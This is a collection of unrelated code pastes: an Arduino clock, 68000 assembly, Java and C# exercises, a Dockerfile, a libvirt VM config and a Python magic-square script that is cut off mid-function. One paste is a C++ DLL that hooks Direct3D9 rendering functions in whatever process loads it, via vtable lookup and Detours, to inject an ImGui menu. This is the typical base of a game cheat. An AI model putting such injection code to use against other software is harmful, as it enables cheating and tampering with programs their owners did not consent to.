char* conn[] = { ""WiFi: no connection."", ""Connect to hotspot"", ""IDEA + open browser"",
                 ""address 192.168.4.1"", ""to enter network name"", ""and password"" };

void setup() {
  oled.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  oled.setRotation(SCREEN_ORIENTATION);
  oled.setTextColor(1);                       // white = 1, black = 0
  myWiFi.setAPCallback(messageNoConnection);  // called when no WiFi connection is found
  myWiFi.autoConnect(""IDEA"");
  configTzTime(timeZone, ""pool.ntp.org"");
}

void loop() {
  struct tm tInfo;  // https://cplusplus.com/reference/ctime/tm/
  getLocalTime(&tInfo);
  oled.clearDisplay();
  oled.setCursor(10, 25);
  oled.setFont(&FreeSansBold18pt7b);
  oled.printf(""%02d:%02d"", tInfo.tm_hour, tInfo.tm_min);
  oled.setFont(&FreeSansBold9pt7b);
  oled.printf("" %02d"", tInfo.tm_sec);
  oled.setCursor(14, 45);
  oled.printf(""%02d -%02d -%04d"", tInfo.tm_mday, 1 + tInfo.tm_mon, 1900 + tInfo.tm_year);
  oled.setCursor(0, 60);
  oled.setFont(&FreeMono9pt7b);
  oled.setTextColor(0);                                        // invisible because we just want to
  oled.print(days[tInfo.tm_wday]);                             // check the cursor x-position
  oled.setTextColor(1);                                        // visible
  oled.setCursor((oled.width() - oled.getCursorX()) / 2, 60);  // x-coordinate if we want to
  oled.print(days[tInfo.tm_wday]);                             // display the weekday centered
  oled.display();
}

void messageNoConnection(WiFiManager* myWiFi) {  // called when no WiFi connection is found
  oled.clearDisplay();
  oled.setTextSize(1);
  for (uint8_t count = 0; count < 6; count++) {
    oled.setCursor(0, count * 10);
    oled.print(conn[count]);
  }
  oled.display();
}"
D63BG8wT,mod192 macro,glokyfull,Motorola 68000 HiSoft Dev,Sunday 12th of May 2024 03:51:31 PM CDT,";
;	move.w #-192*9+$12,d0
;
;
;	nop
;;; modulo 192
;;      you see the code in the debugger and the apropriate hexadecimal opcode
;	move.w #192,d2
;	tst.w d0
;	bmi.s .negatif
;.positif
;	cmp d2,d0
;	blt.s .ok
;	sub d2,d0
;	bra.s .positif
;.negatif
;	add.w d2,d0
;	bmi.s .negatif
;.ok
	
;	illegal
totopc
mod192 macro \1,\2			; then you note the opcode and change the bmi etc as a dc.w statement  so it could be repeated
; here it's a macro but it's the same problem in rept endr
	move.w \2,-(sp)
	move.w #192,\2
	tst.w \1
	dc.w $6b08
	cmp \2,\1
	dc.w $6d08
	sub \2,\1
	dc.w $60F8
	add \2,\1
	dc.w $6bfc
	move.w (sp)+,\2
	endm
modnosp  macro \1,\2
	;move.w \2,-(sp)
	;move.w #192,\2
	tst.w \1
	dc.w $6b08
	cmp \2,\1
	dc.w $6d08
	sub \2,\1
	dc.w $60F8
	add \2,\1
	dc.w $6bfc
	;move.w (sp)+,\2
	endm
"
qbmWpyRB,error imgui,iJorgePc,C++,Sunday 12th of May 2024 03:38:53 PM CDT,"#include <windows.h>
#include <iostream>
#include <imgui.h>
#include <imgui_impl_dx9.h>
#include <imgui_impl_win32.h>
#include ""Hook.h""

bool showMenu = true;
bool initImGui = false;

void InputHandler() {
    for (int i = 0; i < 5; i++) {
        ImGui::GetIO().MouseDown[i] = false;
    }

    int Button = -1;
    if (GetAsyncKeyState(VK_LBUTTON)) {
        Button = 0;
    }

    if (Button != -1) {
        ImGui::GetIO().MouseDown[Button] = true;
    }
}

extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (showMenu && ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam)) {
        return true;
    }
    return CallWindowProc(Process.TargetWndProc, hWnd, msg, wParam, lParam);
}

HRESULT APIENTRY hkEndScene(IDirect3DDevice9* pDevice) {
    if (pDevice == NULL)
        return oEndScene(pDevice);


    if (!initImGui) {
        nDevice = pDevice;
        IMGUI_CHECKVERSION();
        ImGui::CreateContext();

        D3DDEVICE_CREATION_PARAMETERS pParameters;
        pDevice->GetCreationParameters(&pParameters);
        Process.TargetHwnd = pParameters.hFocusWindow;

        if (Process.TargetHwnd != NULL) {
            Process.TargetWndProc = (WNDPROC)SetWindowLongPtr(Process.TargetHwnd, GWLP_WNDPROC, (LONG_PTR)WndProc);
            ImGui_ImplWin32_Init(Process.TargetHwnd);
            ImGui_ImplDX9_Init(pDevice);
            ImGui::GetIO().ImeWindowHandle = Process.TargetHwnd;
            ImGui::GetIO().IniFilename = NULL;
            ImGui::GetIO().LogFilename = NULL;
            initImGui = true;
            pac = 1;
        }   
    }

    if (nDevice != pDevice)
    {
        nDevice = pDevice;
        ImGui_ImplDX9_Init(pDevice);
    }

    ImGui_ImplDX9_NewFrame();
    ImGui_ImplWin32_NewFrame();
    ImGui::NewFrame();

    if (GetAsyncKeyState(VK_INSERT) & 1) 
        showMenu = !showMenu;

    ImGui::GetIO().MouseDrawCursor = showMenu;
    if (showMenu == true) {
        InputHandler();
        ImGui::Begin(""windowsx"", nullptr);

        ImGui::Text(""aea11"");

        ImGui::End();
    }
    ImGui::EndFrame();
    ImGui::Render();
    ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
	return oEndScene(pDevice);
}

HRESULT APIENTRY hkPresent(IDirect3DDevice9* pDevice, const RECT* pSourceRect, const RECT* pDestRect, HWND hDestWindowOverride, const RGNDATA* pDirtyRegion) {
    if (pDevice == NULL)
        return oPresent(pDevice, pSourceRect, pDestRect, hDestWindowOverride, pDirtyRegion);

	return oPresent(pDevice, pSourceRect, pDestRect, hDestWindowOverride, pDirtyRegion);
}

HRESULT APIENTRY hkDrawIndexedPrimitive(IDirect3DDevice9* pDevice, D3DPRIMITIVETYPE Type, INT BaseVertexIndex, UINT MinVertexIndex, UINT NumVertices, UINT startIndex, UINT primCount) {
    if (pDevice == NULL)
        return oDrawIndexedPrimitive(pDevice, Type, BaseVertexIndex, MinVertexIndex, NumVertices, startIndex, primCount);

    return oDrawIndexedPrimitive(pDevice, Type, BaseVertexIndex, MinVertexIndex, NumVertices, startIndex, primCount);
}

HRESULT APIENTRY hkDrawPrimitive(IDirect3DDevice9* pDevice, D3DPRIMITIVETYPE PrimitiveType, UINT StartVertex, UINT PrimitiveCount) {
    if (pDevice == NULL)
        return oDrawPrimitive(pDevice, PrimitiveType, StartVertex, PrimitiveCount);

	return oDrawPrimitive(pDevice, PrimitiveType, StartVertex, PrimitiveCount);
}

HRESULT APIENTRY hkSetTexture(IDirect3DDevice9* pDevice, DWORD Stage, IDirect3DBaseTexture9* pTexture) {
    if (pDevice == NULL)
        return oSetTexture(pDevice, Stage, pTexture);

	return oSetTexture(pDevice, Stage, pTexture);
}

HRESULT APIENTRY hkReset(IDirect3DDevice9* pDevice, D3DPRESENT_PARAMETERS* pPresentationParameters) {
    if (pDevice == NULL)
        return oReset(pDevice, pPresentationParameters);

    ImGui_ImplDX9_InvalidateDeviceObjects();
    auto ResetReturn = oReset(pDevice, pPresentationParameters);
    ImGui_ImplDX9_CreateDeviceObjects();
    return oReset(pDevice, pPresentationParameters);
}

HRESULT APIENTRY hkSetStreamSource(IDirect3DDevice9* pDevice, UINT StreamNumber, IDirect3DVertexBuffer9* pStreamData, UINT OffsetInBytes, UINT Stride) {
    if (pDevice == NULL)
        return oSetStreamSource(pDevice, StreamNumber, pStreamData, OffsetInBytes, Stride);

	return oSetStreamSource(pDevice, StreamNumber, pStreamData, OffsetInBytes, Stride);
}

HRESULT APIENTRY hkSetVertexDeclaration(IDirect3DDevice9* pDevice, IDirect3DVertexDeclaration9* pDecl) {
    if (pDevice == NULL)
        return oSetVertexDeclaration(pDevice, pDecl);

	return oSetVertexDeclaration(pDevice, pDecl);
}

HRESULT APIENTRY hkSetVertexShaderConstantF(IDirect3DDevice9* pDevice, UINT StartRegister, const float* pConstantData, UINT Vector4fCount) {
    if (pDevice == NULL)
        return oSetVertexShaderConstantF(pDevice, StartRegister, pConstantData, Vector4fCount);

	return oSetVertexShaderConstantF(pDevice, StartRegister, pConstantData, Vector4fCount);
}

HRESULT APIENTRY hkSetVertexShader(IDirect3DDevice9* pDevice, IDirect3DVertexShader9* pShader) {
    if (pDevice == NULL)
        return oSetVertexShader(pDevice, pShader);

	return oSetVertexShader(pDevice, pShader);
}

HRESULT APIENTRY hkSetPixelShader(IDirect3DDevice9* pDevice, IDirect3DPixelShader9* pShader) {
    if (pDevice == NULL)
        return oSetPixelShader(pDevice, pShader);

	return oSetPixelShader(pDevice, pShader);
}

DWORD WINAPI InitHook(LPVOID lpParameter) {
    if (checktDirectXVersion(DirectXVersion.D3D9) == false) {
        return FALSE;
    }

    HWND WindowHwnd = CreateWindow(""BUTTON"", ""DX"", WS_SYSMENU | WS_MINIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, 300, 300, NULL, NULL, Process.hModule, NULL);
    if (WindowHwnd == NULL) {
        return FALSE;
    }

    IDirect3D9* IDirect3D9 = Direct3DCreate9(D3D_SDK_VERSION);
    if (IDirect3D9 == NULL) {
        DestroyWindow(WindowHwnd);
        return FALSE;
    }

    D3DPRESENT_PARAMETERS pParameters;
    ZeroMemory(&pParameters, sizeof(pParameters));
    pParameters.Windowed = TRUE;
    pParameters.SwapEffect = D3DSWAPEFFECT_DISCARD;
    pParameters.hDeviceWindow = WindowHwnd;
    pParameters.BackBufferFormat = D3DFMT_UNKNOWN;

    IDirect3DDevice9* pDevice;
    if (IDirect3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, WindowHwnd, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &pParameters, &pDevice) != D3D_OK) {
        IDirect3D9->Release();
        DestroyWindow(WindowHwnd);
        return FALSE;
    }

    if (pDevice == NULL) {
        IDirect3D9->Release();
        DestroyWindow(WindowHwnd);
        return FALSE;
    }

#if defined _M_X64
    DWORD64* DVTable = (DWORD64*)pDevice;
    DVTable = (DWORD64*)DVTable[0];
#elif defined _M_IX86
    DWORD* DVTable = (DWORD*)pDevice;
    DVTable = (DWORD*)DVTable[0];
#endif

    oEndScene = (EndScene)DVTable[42];
    oPresent = (Present)DVTable[17];
    oDrawIndexedPrimitive = (DrawIndexedPrimitive)DVTable[82];
    oDrawPrimitive = (DrawPrimitive)DVTable[81];
    oSetTexture = (SetTexture)DVTable[65];
    oReset = (Reset)DVTable[16];
    oSetStreamSource = (SetStreamSource)DVTable[100];
    oSetVertexDeclaration = (SetVertexDeclaration)DVTable[87];
    oSetVertexShaderConstantF = (SetVertexShaderConstantF)DVTable[94];
    oSetVertexShader = (SetVertexShader)DVTable[92];
    oSetPixelShader = (SetPixelShader)DVTable[107];

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(LPVOID&)oEndScene, (PBYTE)hkEndScene);
    DetourAttach(&(LPVOID&)oPresent, (PBYTE)hkPresent);
    DetourAttach(&(LPVOID&)oDrawIndexedPrimitive, (PBYTE)hkDrawIndexedPrimitive);
    DetourAttach(&(LPVOID&)oDrawPrimitive, (PBYTE)hkDrawPrimitive);
    DetourAttach(&(LPVOID&)oSetTexture, (PBYTE)hkSetTexture);
    DetourAttach(&(LPVOID&)oReset, (PBYTE)hkReset);
    DetourAttach(&(LPVOID&)oSetStreamSource, (PBYTE)hkSetStreamSource);
    DetourAttach(&(LPVOID&)oSetVertexDeclaration, (PBYTE)hkSetVertexDeclaration);
    DetourAttach(&(LPVOID&)oSetVertexShaderConstantF, (PBYTE)hkSetVertexShaderConstantF);
    DetourAttach(&(LPVOID&)oSetVertexShader, (PBYTE)hkSetVertexShader);
    DetourAttach(&(LPVOID&)oSetPixelShader, (PBYTE)hkSetPixelShader);
    DetourTransactionCommit();

    pDevice->Release();
    IDirect3D9->Release();
    DestroyWindow(WindowHwnd);
    return TRUE;
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        Process.hModule = hModule;
        DisableThreadLibraryCalls(hModule);
        CreateThread(0, 0, InitHook, 0, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        ImGui_ImplDX9_Shutdown();
        ImGui_ImplWin32_Shutdown();
        ImGui::DestroyContext();
        FreeLibraryAndExitThread(hModule, 0);
        break;
    }
    return TRUE;
}"
Zu2MBEF3,Untitled,shiretu,C++,Sunday 12th of May 2024 03:00:36 PM CDT,"#pragma once

#include ""raylib.h""
#include ""utils/displays/concept.hpp""
#include <string>

namespace trader {
namespace utils {
namespace displays {
namespace ray {

struct ray_system {
	static constexpr size_t kLog2BoCount = 2;
	static constexpr size_t kBoCount = 1 << kLog2BoCount;
	static constexpr size_t kBoCountMask = kBoCount - 1;
	static constexpr size_t kFontSize{16};
	static constexpr size_t kFontHeight1{kFontSize};
	static constexpr size_t kOptimalDepth{40};
	static constexpr size_t kRowWidth{300};
	static constexpr size_t kWindowWidth{std::min(kRowWidth * kBoCount, size_t{3000})};
	static constexpr size_t kWindowHeight{(kOptimalDepth * 2 + 1) * kFontHeight1 + 10};
	Font _fontTtf;
	RenderTexture2D _target;
	ray_system() {
		InitWindow(kWindowWidth, kWindowHeight, """");
		_fontTtf = LoadFont(""/Users/shiretu/Downloads/Courier New.ttf"");
		_target = LoadRenderTexture(kWindowWidth, kWindowHeight);
		BeginTextureMode(_target);
		ClearBackground(BLACK);
		EndTextureMode();
	}
	~ray_system() { CloseWindow(); }
};

static inline ray_system gSystem;

struct base {
	using color_type = Color;
	static constexpr size_t kOptimalDepth{ray_system::kOptimalDepth};
	static constexpr color_type kColorBackground{BLACK};
	static constexpr color_type kColorWhite{WHITE};
	static constexpr color_type kColorRed{RED};
	static constexpr color_type kColorYellow{YELLOW};
	static constexpr color_type kColorGreen{GREEN};
	void render_text_internal(const size_t windowIdx, const size_t lineIdx, auto&& color, auto&& text) {
		const float x = windowIdx * ray_system::kRowWidth;
		const float y = lineIdx * ray_system::kFontHeight1;
		DrawTextEx(gSystem._fontTtf, text.c_str(), Vector2{x, y}, ray_system::kFontSize, 0, color);
	}
};

struct single_window : base {
	void start_screen_render() {}
	void start_window_render(const size_t windowIdx, auto&& title) {
		BeginTextureMode(gSystem._target);
		DrawRectangle(windowIdx * ray_system::kRowWidth, 0, ray_system::kRowWidth, ray_system::kWindowHeight, kColorBackground);
		render_text_internal(windowIdx, 0, kColorWhite, std::forward<decltype(title)>(title));
	}
	void render_text(const size_t windowIdx, const size_t lineIdx, auto&& color, auto&& text) {
		render_text_internal(windowIdx, lineIdx + 1, std::forward<decltype(color)>(color), std::forward<decltype(text)>(text));
	}
	void end_window_render(const size_t windowIdx) {
		EndTextureMode();
		BeginDrawing();
		DrawTextureRec(
			gSystem._target.texture, Rectangle{0, 0, (float)gSystem._target.texture.width, (float)-gSystem._target.texture.height}, Vector2{0, 0}, WHITE);
		EndDrawing();
	}
	void end_screen_render() {}
};

static_assert(display<single_window>, ""Not a display"");

} // namespace ray
} // namespace displays
} // namespace utils
} // namespace trader
"
WXjmBSFz,ArrayLista primer (Niske),niske,Java,Sunday 12th of May 2024 02:57:43 PM CDT,"import java.util.ArrayList;
import java.util.Collections; // ovo ne treba uopste zapravo :p


public class ArejLista {
	
	public static void main (String[] args) {
			
			ArrayList<String> bolidi = new ArrayList<String>();
			
			bolidi.add(""McLaren Honda MP4/4"");
			bolidi.add(""Ferrari F2002"");
			bolidi.add(""Renault R25"");
			bolidi.add(""RedBull Honda RBPT RB19"");
			bolidi.add(""StefanGP Toyota TF101"");
			bolidi.add(""BrawnGP Mercedes BGP-001"");
			
			bolidi.remove(3);
			System.out.println(bolidi);
			
			System.out.println(""\nNajjaci bolid: "" + bolidi.get(3));
			
			System.out.println();
			
			Collections.sort(bolidi);
			for (String i : bolidi){
					System.out.println(i);
			}
			
			
			
			
	}
}

"
uyi5gdb4,ДЗ: Работа с конкретными строками/столбцами,TeT91,C#,Sunday 12th of May 2024 02:49:27 PM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int minValue = 1;
            int maxValue = 10;

            int[,] numbers = new int[5, 5];
            int selectedRow = 1;
            int selectedColumn = 0;

            int sumSelectedRow = 0;
            int multiplySelectedColumn = 1;

            Console.WriteLine(""Матрица:"");

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    numbers[i, j] = random.Next(minValue, maxValue);

                    Console.Write(numbers[i, j] + "" "");

                    if (i == 0 && j == 0)
                    {
                        multiplySelectedColumn = numbers[i, j];
                    }
                    else if (j == selectedColumn)
                    {
                        multiplySelectedColumn *= numbers[i, j];
                    }

                    if (i == selectedRow)
                    {
                        sumSelectedRow += numbers[i, j];
                    }
                }

                Console.WriteLine();
            }

            Console.WriteLine($""Сумма строки номер {selectedRow + 1} равна {sumSelectedRow}"");
            Console.WriteLine($""произведение столбца номер {selectedColumn + 1} равна {multiplySelectedColumn}"");
            Console.ReadLine();
        }
    }
}
"
mCAggthE,Untitled,Alexander_Usov,Python,Sunday 12th of May 2024 02:26:44 PM CDT,"FROM python:3.11-slim
# используйте образ, который скачали в прошлом уроке
# и в котором уже установлен Python


COPY . ./churn_app
# скопируйте файлы в Docker
# название директории внутри контейнера: churn_app


WORKDIR churn_app
# измените рабочую директорию Docker 


RUN pip3 install -r requirements.txt
# инструкция для установки библиотек

EXPOSE 8081
# инструкция для открытия порта
# используйте порт, который указан в Readme

CMD uvicorn app.main:app --host  0.0.0.0 --port 8081
# какая команда должна исполняться при старте контейнера?"
96KTNdGu,windows11-ryzen5800x-libvirt-xml-13,mmcze,XML,Sunday 12th of May 2024 02:23:34 PM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>25165824</memory>
  <currentMemory unit='KiB'>25165824</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-7.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool1/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool2/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>
"
juVnb7DR,magic_square_generator,Python253,Python,Sunday 12th of May 2024 02:22:20 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: magic_square_generator.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    - This script generates magic squares using the Siamese method, where all rows, columns, and diagonals sum to the same value.
    - The Siamese method initializes by placing the number 1 in the middle column of the top row.
    - Subsequent numbers are then positioned diagonally up and right from the previous number, wrapping around to the last row or first column if necessary.
    - If a cell is already occupied, the next number is placed one row down from the current cell.
    - Padding is applied to ensure uniform appearance across different square dimensions.
    - As the size of the square increases, padding is added to numbers to maintain a consistent number of digits for aesthetic purposes.
    - The algorithm specifically supports odd dimensions for the magic square, as even dimensions are incompatible with the Siamese method.

Parameters:
    - n (int): The size of the magic square (n x n).

Padding:
    * Padding is applied to ensure consistent digit representation in the generated magic squares.
 
    - For dimensions 3x3 to 9x9, 1-digit numbers are padded with leading zeros to have 2 digits.
    - For dimensions 11x11 to 31x31, 2-digit numbers are padded with leading zeros to have 3 digits.
    - For dimensions 33x33 to 99x99, 3-digit numbers are padded with leading zeros to have 4 digits.
    - For dimensions 101x101 to 315x315, 4-digit numbers are padded with leading zeros to have 5 digits.
    - For dimensions 317x317 to 999x999, 5-digit numbers are padded with leading zeros to have 6 digits.  
    - For dimensions 1001x1001 to Infinity, 6-digit numbers are padded with leading zeros to have 7 digits.

    * Please note that higher dimensions containing 7-digit values are not padded further.
    
Requirements:
    - Python3.x
    
Functions:
    - magic_square(n): Generates a magic square of size n x n.
    
Usage:
    - Run the script in a Python environment.
    - Follow the on-screen prompts to enter an odd number greater than 1 as the size of the magic square.
    
Example Expected Output:
------------------------------------------------------------------------------        
                   :: MAGIC SQUARE GENERATOR ::

Enter an odd number greater than 1 as the size of the Magic Square (n x n): 5

                        ┌────────────────┐
                        │ 09 03 22 16 15 │
                        │ 02 21 20 14 08 │
                        │ 25 19 13 07 01 │
                        │ 18 12 06 05 24 │
                        │ 11 10 04 23 17 │
                        └────────────────┘

              The sum of each row/column/diagonal is: 65.0
------------------------------------------------------------------------------

Additional Notes:
    - This algorithm only supports odd dimensions for the magic square.
    - Magic squares for dimensions less than or equal to 1 are not allowed.
    - Dimensions exceeding 8-digit values are not padded further.
""""""

# Function to create Magic Square
def magic_square(n):
    if n < 3:
